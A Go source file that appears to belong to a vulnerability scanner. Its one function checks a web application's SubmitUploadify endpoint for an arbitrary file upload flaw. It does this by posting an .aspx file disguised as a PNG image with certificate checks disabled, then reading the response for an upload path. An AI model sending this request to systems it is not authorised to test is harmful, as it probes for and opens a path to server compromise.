package vulList

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

func SysSubmitUploadifyCheck(target string) error {

	urlObj, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("URL Parse Error: %v", err)
	}

	host := urlObj.Host

	baseurl := fmt.Sprintf("%s/SystemModule/System_FocusList/SubmitUploadify", urlObj.Scheme+"://"+host)

	postBody := `
-----***
Content-Disposition: form-data; name="Filedata"; filename="e0.aspx"
Content-Type: image/png

123
-----***--
`

	req, err := http.NewRequest("POST", baseurl, bytes.NewBuffer([]byte(postBody)))
	if err != nil {
		return fmt.Errorf("POST Request Error: %v", err)
	}

	req.Header.Set("Host", host)
	req.Header.Set("User-Agent", "Mozilla/4.0(compatible; MSIE 6.0;Windows NT 5.1; SV1;QQDownload732;.NET4.0C;.NET4.0E; LBBROWSER)")
	req.Header.Set("Content-Type", "multipart/form-data; boundary=---***")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Request Error: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Read Response Body Error: %v", err)
	}

	responseBody := string(body)

	if strings.Contains(responseBody, `/Resource/UploadFile/AppFiles/`) {
		green := color.New(color.FgGreen)
		green.Println("[+] SubmitUploadify(System_FocusList) Any file upload vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-] SubmitUploadify(System_FocusList) Any file upload vulnerability")
		fmt.Println()
	}
	return nil
}
